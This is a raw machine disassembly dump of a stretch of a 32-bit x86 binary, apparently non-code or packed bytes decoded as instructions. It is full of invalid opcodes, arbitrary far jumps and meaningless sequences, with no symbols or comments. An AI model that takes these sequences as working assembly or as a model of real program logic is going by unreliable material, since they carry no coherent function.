  40c6ef:	add    dl,BYTE PTR [ebp-0x18]
  40c6f2:	or     DWORD PTR [ebx+0x396337c3],eax
  40c6f8:	adc    al,0xd8
  40c6fa:	mov    ebx,0x28d60068
  40c6ff:	loopne 0x40c750
  40c701:	sbb    al,0x31
  40c703:	adc    bh,bh
  40c705:	mov    fs,esi
  40c707:	push   0xf8310c00
  40c70c:	(bad)  
  40c70d:	mov    cl,0xf6
  40c70f:	mov    BYTE PTR [edi+0x0],bh
	...
  40c71d:	add    BYTE PTR [eax],al
  40c71f:	add    BYTE PTR [esi-0x1],dh
  40c722:	mov    dl,BYTE PTR [edi+esi*8+0x3d]
  40c726:	imul   eax,DWORD PTR [eax],0xff6aee79
  40c72c:	pusha  
  40c72d:	out    dx,al
  40c72e:	add    bh,bh
  40c730:	push   esi
  40c731:	fisubr WORD PTR [eax-0x1]
  40c734:	aam    0xfb
  40c736:	pop    es
  40c737:	push   0x63
  40c739:	add    al,0x4
  40c73b:	call   0x44d868
  40c740:	rcl    DWORD PTR [esi+0x58],cl
  40c743:	cld    
  40c744:	retf   
  40c745:	mov    ebx,0xa563004c
  40c74a:	ror    BYTE PTR [edi],0x63
  40c74d:	cdq    
  40c74e:	mov    ebx,ebp
  40c750:	pushf  
  40c751:	mov    al,0xa
  40c753:	dec    DWORD PTR [esi]
  40c755:	(bad)  
  40c756:	jmp    0xefe:0xde470b52
  40c75d:	shr    dl,cl
  40c75f:	xchg   edi,eax
  40c760:	cs out dx,al
  40c762:	add    dl,cl
  40c764:	sub    DWORD PTR [edx-0x3d],0x1
  40c768:	adc    esp,DWORD PTR [edi]
  40c76a:	pop    eax
  40c76b:	or     al,0x64
  40c76d:	add    al,0x9c
  40c76f:	sti    
  40c770:	inc    esp
  40c771:	push   esi
  40c772:	mov    eax,ds:0x9bd755de
  40c777:	test   DWORD PTR [ebp+0x51],0xfdcfdef9
  40c77e:	adc    BYTE PTR [ecx-0x45],ah
  40c781:	(bad)  
  40c782:	std    
  40c783:	retf   
	...
  40c790:	add    BYTE PTR [eax],al
  40c792:	add    BYTE PTR [edx],ah
  40c794:	bnd call 0xee2a9fd2
  40c79a:	push   edi
  40c79b:	pop    ebx
  40c79c:	(bad)  
  40c79d:	pop    ebx
  40c79e:	cld    
  40c79f:	add    al,0xfc
  40c7a1:	pusha  
  40c7a2:	fst    QWORD PTR ds:0xfb105bd7
  40c7a8:	mov    BYTE PTR [esp+eax*1],bl
  40c7ab:	arpl   WORD PTR [ebp+0x19],ax
  40c7ae:	fnsave [edi+0x9]
  40c7b1:	mov    esi,0xf1ed5b57
  40c7b6:	pop    ebx
  40c7b7:	in     al,dx
  40c7b8:	(bad)  
  40c7b9:	lods   eax,DWORD PTR ds:[esi]
  40c7ba:	push   edi
  40c7bb:	dec    edi
  40c7bc:	(bad)  
  40c7bd:	sbb    esi,esp
  40c7bf:	fst    QWORD PTR [eax+0x1]
  40c7c2:	in     al,dx
  40c7c3:	xchg   DWORD PTR [ebp-0x6a],ebx
  40c7c6:	fstp   QWORD PTR [ebx+0x2e03f4c3]
  40c7cc:	mov    dl,BYTE PTR [ebx+eax*4-0x22864e60]
  40c7d3:	mov    ch,0xd6
  40c7d5:	sti    
  40c7d6:	sti    
  40c7d7:	fild   WORD PTR [eax-0x295a2018]
  40c7dd:	mov    eax,0x510d17dc
  40c7e2:	mov    esi,0xdd55d696
  40c7e7:	pop    ss
  40c7e8:	std    
  40c7e9:	pop    ebx
  40c7ea:	xchg   DWORD PTR [esi+ecx*8-0x29d322bb],eax
  40c7f1:	mov    bl,0xf
  40c7f3:	je     0x40c845
  40c7f5:	add    cl,ah
	...
  40c803:	add    BYTE PTR [eax],al
  40c805:	add    BYTE PTR [eax-0xe],bh
  40c808:	(bad)  
  40c809:	xchg   BYTE PTR cs:[eax+eax*1-0x6d],ch
  40c80e:	pusha  
  40c80f:	ins    DWORD PTR es:[edi],dx
  40c810:	(bad)  
  40c811:	jmp    0xd167:0x6c8d0560
  40c818:	dec    BYTE PTR [esi]
  40c81a:	(bad)  
  40c81b:	imul   edi,edi,0x6
  40c81e:	xchg   esp,eax
  40c81f:	cmc    
  40c820:	imul   ebp,ecx,0x5be805ca
  40c826:	xchg   ebx,eax
  40c827:	add    eax,0xe5dc2600
  40c82c:	repnz out 0x3f,al
  40c82f:	push   es
  40c830:	add    cl,ch
  40c832:	pusha  
  40c833:	mov    esi,0xd733dd84
  40c838:	(bad)  
  40c839:	jmp    0x40c89b
  40c83b:	add    eax,0xcde5ae00
  40c840:	repnz mov esi,0xe9fed617
  40c846:	pusha  
  40c847:	mov    esi,0xd713ad84
  40c84c:	(bad)  
  40c84d:	jmp    0x7240cdb2
  40c852:	(bad)  
  40c853:	std    
  40c854:	mov    bh,bl
  40c856:	cmp    al,BYTE PTR ds:0xd2b0648d
  40c85c:	inc    BYTE PTR [esi-0x727b7790]
  40c862:	xchg   ebx,eax
  40c863:	(bad)  
  40c864:	(bad)  
  40c865:	sbb    esp,ebx
  40c867:	and    bh,0x7a
	...
  40c876:	add    BYTE PTR [eax],al
  40c878:	add    BYTE PTR [edi+0x35664fd6],al
  40c87e:	cmc    
  40c87f:	(bad)  
  40c880:	aam    0x64
  40c882:	(bad)  
  40c883:	je     0x40c866
  40c885:	cli    
  40c886:	add    al,0xff
  40c888:	aam    0x88
  40c88a:	(bad)  
  40c88b:	push   ecx
  40c88c:	add    dh,cl
  40c88e:	test   BYTE PTR [ebx-0x246c618],bh
  40c894:	add    BYTE PTR [ebp+0x7a011a7d],al
  40c89a:	add    DWORD PTR [ebx-0x24a8943],eax
  40c8a0:	dec    DWORD PTR [edx+0x2]
  40c8a3:	test   BYTE PTR [edi],cl
  40c8a5:	cmp    ecx,DWORD PTR [ecx]
  40c8a7:	add    bh,al
  40c8a9:	mov    edi,0x65fff19c
  40c8ae:	or     BYTE PTR [eax],al
  40c8b0:	out    dx,eax
  40c8b1:	je     0x40c913
  40c8b3:	xchg   BYTE PTR [ecx-0x5],al
  40c8b6:	or     BYTE PTR [ebp-0x24ac57b],cl
  40c8bc:	call   FWORD PTR [edx-0x1f]
  40c8bf:	adc    cl,BYTE PTR [edx+ecx*1+0x9]
  40c8c3:	test   eax,eax
  40c8c5:	scas   al,BYTE PTR es:[edi]
  40c8c6:	dec    ebx
  40c8c7:	mov    DWORD PTR [ebp-0x24332],0xbeef090b
  40c8d1:	xchg   edx,eax
  40c8d2:	push   ecx
  40c8d3:	inc    eax
  40c8d4:	inc    ecx
  40c8d5:	cli    
  40c8d6:	jge    0x40c85b
  40c8d8:	add    BYTE PTR [esi+0x50fdb0],dh
	...
  40c8ea:	add    BYTE PTR [eax],al
  40c8ec:	repnz mov dh,0x49
  40c8ef:	add    dl,cl
  40c8f1:	test   DWORD PTR [esi-0x7c38668c],edi
  40c8f7:	aam    0xe9
  40c8f9:	mov    al,0xfd
  40c8fb:	add    cl,dl
  40c8fd:	fistp  QWORD PTR [eax+ebp*2+0x414a7a]
  40c904:	inc    edi
  40c905:	xchg   dh,bh
  40c907:	sti    
  40c908:	xor    eax,0x5ce84eb0
  40c90d:	inc    esp
  40c90e:	add    BYTE PTR [eax],al
  40c910:	dec    eax
  40c912:	or     eax,0x37f6385
  40c917:	add    BYTE PTR [ebx-0x3a],ah
  40c91a:	mov    esi,0x87de2240
  40c91f:	test   BYTE PTR [ebx+0x1a],ah
  40c922:	(bad)  
  40c924:	adc    eax,DWORD PTR [esi-0x4d]
  40c927:	dec    ebx
  40c928:	arpl   si,bx
  40c92a:	or     eax,0x856dd7c0
  40c92f:	cmp    al,0x64
  40c931:	mov    al,ds:0xeb630043
  40c936:	jle    0x40c8b8
  40c938:	arpl   si,bx
  40c93a:	add    bh,bh
  40c93c:	div    ch
  40c93e:	(bad)  
  40c93f:	(bad)  
  40c940:	xor    al,0x63
  40c942:	sbb    edi,0xfed9db30
  40c948:	out    dx,al
  40c949:	rcl    ebp,1
  40c94b:	(bad)  
  40c94c:	sbb    al,0x5b
  40c94e:	and    bl,0x0
	...
  40c95d:	add    BYTE PTR [eax],al
  40c95f:	adc    BYTE PTR [ebx-0x6a197327],dh
  40c965:	aad    0xfe
  40c967:	add    al,0xe
  40c969:	outs   dx,BYTE PTR ds:[esi]
  40c96a:	add    DWORD PTR [ecx-0x76ff9322],ecx
  40c970:	fisubr WORD PTR [eax+eax*1-0x22]
  40c974:	pusha  
  40c975:	jecxz  0x40c969
  40c977:	in     al,0xa2
  40c979:	xor    bh,bh
  40c97b:	jbe    0x40c958
  40c97d:	inc    esp
  40c97e:	inc    ecx
  40c97f:	arpl   di,dx
  40c981:	ret    0x2473
  40c984:	jnp    0x40c9d5
  40c986:	adc    al,0xc4
  40c988:	cmp    BYTE PTR [ebx-0x2675430e],bh
  40c98e:	mov    ah,0x97
  40c990:	dec    esi
  40c991:	(bad)  
  40c993:	lods   al,BYTE PTR ds:[esi]
  40c994:	shl    dl,1
  40c996:	(bad)  
  40c997:	out    dx,al
  40c998:	jns    0x40c96f
  40c99a:	(bad)  
  40c99b:	pushf  
  40c99c:	add    al,0x51
  40c99e:	ficom  WORD PTR [edi-0x2825a22d]
  40c9a4:	mov    al,0x59
  40c9a6:	fiadd  DWORD PTR [ebp+0x634d2edc]
  40c9ac:	add    eax,0x5975f852
  40c9b1:	aad    0xda
  40c9b3:	mov    bh,0xdc
  40c9b5:	cmp    edx,ebx
  40c9b7:	shl    DWORD PTR gs:[ebx-0x19],cl
  40c9bb:	push   ecx
  40c9bc:	shl    DWORD PTR ds:0x1df5cfda,cl
  40c9c2:	nop
	...
  40c9cf:	add    BYTE PTR [eax],al
  40c9d1:	add    BYTE PTR [eax],dh
  40c9d3:	xlat   BYTE PTR ds:[ebx]
  40c9d4:	adc    eax,0xbb53cda
  40c9d9:	fidivr DWORD PTR ds:0x31e73bd3
  40c9df:	sar    ebp,cl
  40c9e1:	jmp    0xc81a:0x3e93f10
  40c9e8:	aam    0x3
  40c9ea:	mov    dh,0x7e
  40c9ec:	aam    0x85
  40c9ee:	and    BYTE PTR [esi-0x64872cb],cl
  40c9f4:	popa   
  40c9f5:	not    bh
  40c9f7:	dec    eax
  40c9f8:	xchg   ecx,eax
  40c9f9:	xor    al,0x89
  40c9fb:	add    eax,0xd2674fc6
  40ca00:	xor    ecx,DWORD PTR [ecx+edi*2]
  40ca03:	add    eax,0xd24f4fb6
  40ca08:	sbb    dh,BYTE PTR [eax]
  40ca0a:	out    0xc5,al
  40ca0c:	sbb    esi,DWORD PTR [eax]
  40ca0e:	pushf  
  40ca0f:	dec    eax
  40ca10:	pop    ebp
  40ca11:	add    al,0x63
  40ca13:	add    eax,0x8d2f8ce9
  40ca18:	popa   
  40ca19:	imul   bh
  40ca1b:	dec    eax
  40ca1c:	inc    ebp
  40ca1d:	xor    al,0xe6
  40ca1f:	dec    eax
  40ca20:	test   eax,0xfff53934
  40ca25:	jne    0x40ca3b
  40ca27:	(bad)  
  40ca28:	(bad)  
  40ca29:	sbb    ebp,DWORD PTR [ebx-0x7a]
  40ca2c:	jl     0x40c9d3
  40ca2e:	pop    edi
  40ca2f:	pop    ecx
  40ca30:	daa    
  40ca31:	ins    BYTE PTR es:[edi],dx
  40ca32:	xor    al,0xc5
  40ca34:	(bad)  
  40ca35:	fadd   QWORD PTR [eax]
	...
  40ca43:	add    BYTE PTR [eax],al
  40ca45:	je     0x40ca1a
  40ca47:	je     0x40ca42
  40ca49:	fwait
  40ca4a:	sbb    edi,edi
  40ca4c:	mov    esp,0xf174d25c
  40ca51:	js     0x40ca09
  40ca53:	cld    
  40ca54:	ss mov dl,bl
  40ca57:	ss inc ecx
  40ca59:	les    edi,FWORD PTR [esi]
  40ca5b:	add    cl,ch
  40ca5d:	(bad)  
  40ca5f:	add    ebx,DWORD PTR [esi]
  40ca61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca62:	xchg   ecx,eax
  40ca63:	je     0x40ca9c
  40ca65:	ss fwait
  40ca67:	mov    dh,BYTE PTR [eax+ebx*8-0x5bf9ee82]
  40ca6e:	(bad)  
  40ca6f:	(bad)  
  40ca70:	fwait
  40ca71:	pop    eax
  40ca72:	xor    cl,cl
  40ca74:	sub    ebp,DWORD PTR [edi]
  40ca76:	rcl    BYTE PTR [ebx+0x62],cl
  40ca79:	or     eax,DWORD PTR [ebp-0x2cc51e3d]
  40ca7f:	(bad)  
  40ca80:	fidivr WORD PTR ss:[eax]
  40ca83:	adc    BYTE PTR [edx+0xe],ah
  40ca86:	add    DWORD PTR [ecx+edx*8+0x19fed31a],0x34ff0585
  40ca91:	pop    edi
  40ca92:	pop    edi
  40ca93:	add    BYTE PTR [esi+0x1bfef595],dh
  40ca99:	jnp    0x40ca23
  40ca9b:	mov    edi,0x84ca421c
  40caa0:	popf   
  40caa1:	stos   BYTE PTR es:[edi],al
  40caa2:	sar    dh,cl
  40caa4:	jmp    0x6240d009
	...
  40cab5:	add    BYTE PTR [eax],al
  40cab7:	add    BYTE PTR [ebp-0x26],cl
  40caba:	std    
  40cabb:	add    ch,bl
  40cabd:	lods   al,BYTE PTR ds:[esi]
  40cabe:	mov    DWORD PTR [edx],edx
  40cac0:	aas    
  40cac1:	push   ebx
  40cac2:	sti    
  40cac3:	(bad)  
  40cac4:	sub    eax,0x78d4ead
  40cac9:	push   es
  40caca:	(bad)  
  40cacb:	(bad)  
  40cacc:	std    
  40cacd:	adc    eax,0x832d106a
  40cad2:	idiv   dh
  40cad4:	sub    eax,0x9e52fdad
  40cad9:	mov    BYTE PTR [ebx-0x252e304],bh
  40cadf:	add    BYTE PTR [esi+0x7abd8d27],dh
  40cae5:	lods   al,BYTE PTR ds:[esi]
  40cae6:	std    
  40cae7:	dec    DWORD PTR [ebp-0x800efc1]
  40caed:	or     BYTE PTR [edi-0x1],dl
  40caf0:	idiv   esp
  40caf2:	out    0x13,eax
  40caf4:	ins    DWORD PTR es:[edi],dx
  40caf5:	lods   eax,DWORD PTR ds:[esi]
  40caf6:	std    
  40caf7:	add    DWORD PTR [ebp+0x5e8dfdd4],0xffffffae
  40cafe:	std    
  40caff:	push   DWORD PTR [edi-0x3e55161a]
  40cb05:	pop    edi
  40cb06:	idiv   esi
  40cb08:	or     eax,0xfd1289b9
  40cb0d:	jbe    0x40cb05
  40cb0f:	(bad)  
  40cb10:	sub    eax,0x252fdb9
  40cb15:	sbb    cl,cl
  40cb17:	ret    0x51e
  40cb1a:	push   ebp
  40cb1b:	mov    eax,DWORD PTR [eax]
	...
  40cb29:	add    BYTE PTR [eax],al
  40cb2b:	push   cs
  40cb2c:	mov    eax,edx
  40cb2e:	clc    
  40cb2f:	lods   al,BYTE PTR ds:[esi]
  40cb30:	mov    eax,0x168157fd
  40cb35:	or     al,0x8b
  40cb37:	mov    eax,0xfcf8837d
  40cb3c:	mov    eax,0x97050fd
  40cb41:	push   0x0
  40cb43:	arpl   WORD PTR [edi+0x50],si
  40cb46:	or     al,0xbc
  40cb48:	or     al,0x1c
  40cb4a:	test   DWORD PTR [ebx+0x26c735d1],esp
  40cb50:	push   edx
  40cb51:	add    al,0x0
  40cb53:	arpl   si,bx
  40cb55:	jb     0x40cae1
  40cb57:	not    BYTE PTR [esi-0x2a]
  40cb5a:	(bad)  
  40cb5b:	xchg   esp,eax
  40cb5c:	push   ebx
  40cb5d:	repnz mov WORD PTR [esi],fs
  40cb60:	xor    dh,BYTE PTR [ecx*4-0x129c522]
  40cb67:	jl     0x40caf7
  40cb69:	push   0xdc517410
  40cb6e:	std    
  40cb6f:	ins    BYTE PTR es:[edi],dx
  40cb70:	(bad)  
  40cb72:	push   ecx
  40cb73:	push   edi
  40cb74:	cmp    DWORD PTR cs:[edi+ebx*2-0x22],0x72
  40cb7a:	jae    0x40caff
  40cb7c:	pop    ecx
  40cb7d:	cdq    
  40cb7e:	sti    
  40cb7f:	dec    ebp
  40cb80:	out    dx,eax
  40cb81:	(bad)  
  40cb82:	pop    DWORD PTR [ecx+esi*2+0x6]
  40cb86:	push   DWORD PTR [esi+0x6be82de6]
  40cb8c:	pop    es
  40cb8d:	xlat   BYTE PTR ds:[ebx]
  40cb8e:	inc    BYTE PTR [eax]
	...
  40cb9c:	add    BYTE PTR [eax],al
  40cb9e:	loopne 0x40cbc6
  40cba0:	hlt    
  40cba1:	(bad)  
  40cba2:	and    al,0xa9
  40cba4:	(bad)  
  40cba5:	(bad)  
  40cba6:	xchg   esi,eax
  40cba7:	add    eax,0x52d1ea74
  40cbac:	jo     0x40cba5
  40cbae:	or     eax,0x718ad5af
  40cbb3:	mov    bh,0x8f
  40cbb5:	idiv   ebp
  40cbb7:	mov    esi,0xd691fed5
  40cbbc:	xor    eax,0x2d621c9
  40cbc1:	push   ebp
  40cbc2:	fmul   st,st(1)
  40cbc4:	add    ebx,0x74d6f813
  40cbca:	addr16 add eax,0x51bcc91
  40cbd0:	jmp    0xec9a6edf
  40cbd5:	xor    eax,0x3dcc2aa
  40cbda:	xchg   edx,eax
  40cbdb:	in     al,0x69
  40cbdd:	ret    
  40cbde:	bound  edi,QWORD PTR [eax+ebx*4-0x78]
  40cbe2:	pop    ds
  40cbe3:	loope  0x40cbfd
  40cbe5:	xor    bl,BYTE PTR [ecx+ebx*2+0x7f00ebdd]
  40cbec:	gs (bad) 
  40cbee:	cmp    DWORD PTR [esi-0x2450b791],edi
  40cbf4:	loop   0x40cc03
  40cbf6:	ins    BYTE PTR es:[edi],dx
  40cbf7:	xchg   edi,eax
  40cbf8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cbf9:	sub    al,0x87
  40cbfb:	add    eax,0x8423afac
  40cc00:	aas    
  40cc01:	out    dx,eax
	...
  40cc0e:	add    BYTE PTR [eax],al
  40cc10:	add    dl,dh
  40cc12:	aad    0x1
  40cc14:	into   
  40cc15:	jmp    0x40cc6f
  40cc17:	sbb    edx,ebp
  40cc19:	jl     0x40cc32
  40cc1b:	test   BYTE PTR [ebp+0x330d1fa0],0xbb
  40cc22:	cmp    ch,BYTE PTR [ebx-0x5c7f9cbc]
  40cc28:	mov    ebx,0x4c14dda4
  40cc2d:	arpl   WORD PTR ds:0x8058bf6a,ax
  40cc33:	stos   DWORD PTR es:[edi],eax
  40cc34:	mov    ebx,0xb373ceac
  40cc39:	cld    
  40cc3a:	jge    0x40cc9d
  40cc3c:	aad    0xd
  40cc3e:	jge    0x40cc63
  40cc40:	mov    ah,0x9e
  40cc42:	adc    dh,0xf0
  40cc45:	jb     0x40cbf9
  40cc47:	addr16 pop edi
  40cc49:	bswap  edi
  40cc4b:	call   0x340f2f53
  40cc50:	mov    al,0x7c
  40cc52:	cmp    al,BYTE PTR [eax]
  40cc54:	sub    esp,DWORD PTR [eax]
  40cc56:	add    eax,0x3f17248d
  40cc5b:	call   0x45e4c5
  40cc60:	push   0xffffffa3
  40cc62:	cli    
  40cc63:	mov    WORD PTR [edi+edi*8],gs
  40cc66:	notrack call DWORD PTR [edi+ebp*8]
  40cc6a:	out    0x57,al
  40cc6c:	add    dl,BYTE PTR [esi-0x10db7731]
  40cc72:	add    DWORD PTR [ebp+eiz*4+0x0],0x0
	...
  40cc82:	add    BYTE PTR [eax],al
  40cc84:	push   edi
  40cc85:	into   
  40cc86:	je     0x40cc21
  40cc88:	pop    es
  40cc89:	xor    eax,0xce60a842
  40cc8e:	xor    al,0xb4
  40cc90:	cmp    DWORD PTR [eax+eax*1+0x41],eax
  40cc94:	add    cl,BYTE PTR [ebx-0x1]
  40cc97:	dec    esi
  40cc98:	push   0xffffffc5
  40cc9a:	push   cs
  40cc9b:	ins    DWORD PTR es:[edi],dx
  40cc9c:	dec    ch
  40cc9e:	(bad)  
  40cc9f:	jmp    0x6b09167d
  40cca4:	mov    ah,0xc1
  40cca6:	(bad)  
  40cca7:	fst    st(4)
  40cca9:	test   bh,bh
  40ccab:	call   0xedb59b10
  40ccb0:	cmp    BYTE PTR [edx],al
  40ccb2:	dec    ecx
  40ccb3:	jmp    0x6b208118
  40ccb8:	pop    ds
  40ccb9:	add    al,0x89
  40ccbb:	lods   al,BYTE PTR ds:[esi]
  40ccbc:	ror    dh,1
  40ccbe:	je     0x40ccad
  40ccc0:	fisttp WORD PTR [eax-0x4c]
  40ccc3:	imul   BYTE PTR [ebp+0x20a48ec1]
  40ccc9:	iret   
  40ccca:	je     0x40cc7d
  40cccc:	out    0x48,eax
  40ccce:	les    esp,FWORD PTR [esi-0x17006ebb]
  40ccd4:	pusha  
  40ccd5:	add    eax,0x1c660c83
  40ccda:	inc    ecx
  40ccdb:	add    dl,bh
  40ccdd:	add    DWORD PTR [eax+edx*2+0x77],esi
  40cce1:	(bad)  
  40cce3:	push   eax
  40cce4:	and    BYTE PTR [edx],al
  40cce6:	push   0x0
	...
  40ccf4:	add    BYTE PTR [eax],al
  40ccf6:	add    BYTE PTR [eax],ah
  40ccf8:	or     DWORD PTR [ebp+0x6a122a45],ecx
  40ccfe:	add    BYTE PTR [edi],dh
  40cd00:	xadd   BYTE PTR [eax-0x2b],dl
  40cd04:	fidiv  WORD PTR ds:0xb098b29
  40cd0a:	shr    BYTE PTR [esi+0x667d82f3],0x2
  40cd11:	je     0x40cd3f
  40cd13:	or     DWORD PTR [edi],esi
  40cd15:	adc    BYTE PTR [eax],al
  40cd17:	mov    ?,ecx
  40cd19:	mov    dl,BYTE PTR [ebp-0x76]
  40cd1c:	das    
  40cd1d:	mov    DWORD PTR [edx],0x75ff0965
  40cd23:	cmp    BYTE PTR [eax+0x3f25b873],0xbc
  40cd2a:	jmp    FWORD PTR [edi+0x7a036805]
  40cd30:	call   0xaeefb5f1
  40cd35:	std    
  40cd36:	inc    DWORD PTR [ebp-0x6f1743c5]
  40cd3c:	or     DWORD PTR [eax],eax
  40cd3e:	add    BYTE PTR [ebp+0x3b],ah
  40cd41:	enter  0xa6e8,0x3a
  40cd45:	(bad)  
  40cd46:	jmp    DWORD PTR [ebp+0x3b]
  40cd49:	shr    al,1
  40cd4b:	sahf   
  40cd4c:	cmp    bh,bh
  40cd4e:	inc    esp
  40cd50:	mov    edi,0x1c0a0cc0
  40cd55:	mov    ebp,esp
  40cd57:	mov    DWORD PTR [esi+eax*8+0x8d],ecx
	...
  40cd6a:	aas    
  40cd6b:	mov    ch,0x4e
  40cd6d:	push   0x41435d
  40cd72:	arpl   WORD PTR [eax+0x9],cx
  40cd75:	push   0x63
  40cd77:	inc    esi
  40cd78:	sti    
  40cd79:	inc    ecx
  40cd7a:	mov    ds:0x9bbddade,al
  40cd7f:	fiadd  WORD PTR [edx]
  40cd81:	test   DWORD PTR [ebx+0x63bf7ae3],esp
  40cd87:	fiadd  WORD PTR [edx]
  40cd89:	mov    esi,DWORD PTR [esi]
  40cd8b:	mov    ds:0x21d6117e,al
  40cd90:	int3   
  40cd91:	dec    edi
  40cd92:	mov    esp,0x11fecfe9
  40cd97:	fiadd  DWORD PTR [edi+0x72565cbf]
  40cd9d:	jmp    DWORD PTR [esi+ebx*8-0x2164837b]
  40cda4:	add    DWORD PTR [edi+ebp*8-0x5bfffd22],eax
  40cdab:	cdq    
  40cdac:	mov    dh,0xff
  40cdae:	test   dh,bl
  40cdb0:	add    al,bh
  40cdb2:	es push ss
  40cdb4:	add    al,0x0
  40cdb6:	arpl   si,bx
  40cdb8:	leave  
  40cdb9:	inc    esp
  40cdba:	xchg   ebx,eax
  40cdbb:	test   BYTE PTR [ebx],0x0
  40cdbe:	arpl   WORD PTR [ebx],sp
  40cdc0:	dec    ecx
  40cdc1:	int3   
  40cdc2:	arpl   si,bx
  40cdc4:	add    al,BYTE PTR [eax]
  40cdc6:	call   0x71cb983b
  40cdcb:	push   ecx
  40cdcc:	dec    ecx
  40cdcd:	int3   
	...
  40cdda:	add    BYTE PTR [eax],al
  40cddc:	add    BYTE PTR [ebx-0x6c2fb6a7],dh
  40cde2:	mov    BYTE PTR [ebx],al
  40cde4:	jmp    FWORD PTR [esi+0x5f51d2f6]
  40cdea:	xlat   BYTE PTR ds:[ebx]
  40cdeb:	ret    0x8f74
  40cdee:	pop    edi
  40cdef:	push   ecx
  40cdf0:	int3   
  40cdf1:	bound  ecx,QWORD PTR [ecx+0x41]
  40cdf4:	adc    DWORD PTR [esi-0x5a8bfc0e],0x5
  40cdfb:	push   ecx
  40cdfc:	dec    ebx
  40cdfd:	mov    eax,ds:0x77d2e946
  40ce02:	mov    cl,0xc0
  40ce04:	enter  0x59c,0xe9
  40ce08:	(bad)  
  40ce09:	lods   al,BYTE PTR ds:[esi]
  40ce0a:	push   eax
  40ce0b:	repz imul ebx,DWORD PTR [eax*1+0x41ea03e9],0xc45ddea1
  40ce17:	and    edi,DWORD PTR [esp+ecx*8-0x3bfc1735]
  40ce1e:	push   ecx
  40ce1f:	mov    cl,0xd2
  40ce21:	aaa    
  40ce22:	mov    cl,0x95
  40ce24:	pop    eax
  40ce25:	imul   ebx,ebp,0xffffff86
  40ce28:	shr    BYTE PTR [ebp-0x70a77a35],1
  40ce2e:	(bad)  
  40ce30:	cmp    esp,DWORD PTR [ebx+0x5]
  40ce33:	push   0x50
  40ce35:	mov    ebx,0x8dfbf504
  40ce3a:	push   ecx
  40ce3b:	inc    ecx
  40ce3c:	fistp  DWORD PTR [ebp+edi*1-0x17]
  40ce40:	add    eax,DWORD PTR [eax]
	...
  40ce4e:	add    BYTE PTR [eax],al
  40ce50:	mov    BYTE PTR [eax+0x61],bh
  40ce53:	cmp    BYTE PTR [ebx+0x7f],bh
  40ce56:	cli    
  40ce57:	shl    bh,cl
  40ce59:	int3   
  40ce5a:	inc    ebp
  40ce5b:	xor    eax,0xcf93805b
  40ce60:	jmp    0x5799045c
  40ce65:	retf   
  40ce66:	call   0xae03:0xecc81bfb
  40ce6d:	jle    0x40ce7b
  40ce6f:	xchg   BYTE PTR [eax],ah
  40ce71:	out    0xbe,al
  40ce73:	xchg   BYTE PTR [edi+0x7e],dh
  40ce76:	stos   BYTE PTR es:[edi],al
  40ce77:	inc    esp
  40ce78:	arpl   WORD PTR ds:0x11df17c,ax
  40ce7e:	jb     0x40cec5
  40ce80:	mov    ds:0x60e80005,al
  40ce85:	add    eax,0x44e12f00
  40ce8a:	inc    ecx
  40ce8b:	jmp    0xa8a6d2b7
  40ce90:	dec    ecx
  40ce91:	pop    es
  40ce92:	sub    DWORD PTR [edi+0xf83635d],0x67
  40ce99:	push   eax
  40ce9a:	repz push 0x54
  40ce9d:	ret    0x282d
  40cea0:	addr16 add eax,0xcaa66d0f
  40cea6:	(bad)  
  40cea7:	jmp    0xd803d893
  40ceac:	and    DWORD PTR ds:0xd8e4ee00,eax
  40ceb2:	(bad)  
  40ceb3:	call   0x40ceb8
	...
  40cec0:	add    BYTE PTR [eax],al
  40cec2:	add    BYTE PTR [eax-0x7a],ah
  40cec5:	cmp    al,0xd6
  40cec7:	dec    ecx
  40cec8:	inc    esp
  40cec9:	add    cl,ch
  40cecb:	arpl   WORD PTR [ecx+0x560e9e0],ax
  40ced1:	(bad)  
  40ced2:	sub    al,0xb3
  40ced4:	retf   0xe9fe
  40ced7:	pusha  
  40ced8:	ret    0x6144
  40cedb:	pop    edi
  40cedc:	add    eax,0x40fde900
  40cee1:	cld    
  40cee2:	mov    ecx,0xb9f840f5
  40cee7:	push   cs
  40cee8:	add    eax,0x441d2068
  40ceed:	add    BYTE PTR [esi],bh
  40ceef:	push   esp
  40cef0:	(bad)  
  40cef1:	sub    eax,0xbffe60a8
  40cef6:	fsubrp st(4),st
  40cef8:	(bad)  
  40cef9:	(bad)  
  40cefa:	call   0x21bd555f
  40ceff:	addr16 cli 
  40cf01:	add    DWORD PTR [ebp+0x5f],0x5
  40cf05:	add    BYTE PTR [edx-0x64],ch
  40cf08:	leave  
  40cf09:	(bad)  
  40cf0a:	jmp    FWORD PTR ds:0xa00a082
  40cf10:	push   es
  40cf11:	mov    esi,DWORD PTR [ebp+0xe]
  40cf14:	scas   eax,DWORD PTR es:[edi]
  40cf15:	add    BYTE PTR [eax],0xfa
  40cf18:	add    eax,0xb4648b56
  40cf1d:	je     0x40cf37
  40cf1f:	lea    eax,[ebx-0x10]
  40cf22:	call   DWORD PTR [ebp+edx*8+0x458d]
	...
  40cf35:	add    BYTE PTR [esi],dl
  40cf37:	pop    DWORD PTR cs:[edx+0x3b]
  40cf3b:	add    eax,ebp
  40cf3d:	xlat   BYTE PTR ds:[ebx]
  40cf3e:	test   BYTE PTR [ecx],al
  40cf40:	add    cl,dl
  40cf42:	stos   BYTE PTR es:[edi],al
  40cf43:	cmp    BYTE PTR [esi-0x1fbcbcfe],0x68
  40cf4a:	dec    ebp
  40cf4b:	inc    eax
  40cf4c:	inc    ecx
  40cf4d:	add    BYTE PTR [ebp+0x43],cl
  40cf50:	in     al,0xc7
  40cf52:	xchg   ebp,esp
  40cf54:	(bad)  
  40cf55:	(bad)  
  40cf56:	mov    edx,0xd2458d05
  40cf5b:	adc    eax,0x170016a
  40cf60:	push   0x0
  40cf62:	inc    DWORD PTR [edx-0x20]
  40cf65:	push   eax
  40cf66:	pusha  
  40cf67:	add    DWORD PTR [ebp-0xe9d5bb],ecx
  40cf6d:	adc    eax,0x40ee55
  40cf72:	add    ebp,0x3af92d72
  40cf78:	in     al,dx
  40cf79:	add    BYTE PTR [esi+0x4a01b81c],ah
  40cf7f:	add    eax,0x308a0b00
  40cf84:	push   ss
  40cf85:	call   DWORD PTR [edi]
  40cf87:	int    0xfd
  40cf89:	jne    0x40cffd
  40cf8b:	mov    ch,0x73
  40cf8d:	in     al,dx
  40cf8e:	pop    ebp
  40cf8f:	or     BYTE PTR cs:[eax+0x63],ch
  40cf93:	fiadd  DWORD PTR [edx]
  40cf95:	out    dx,eax
  40cf96:	in     eax,dx
  40cf97:	push   es
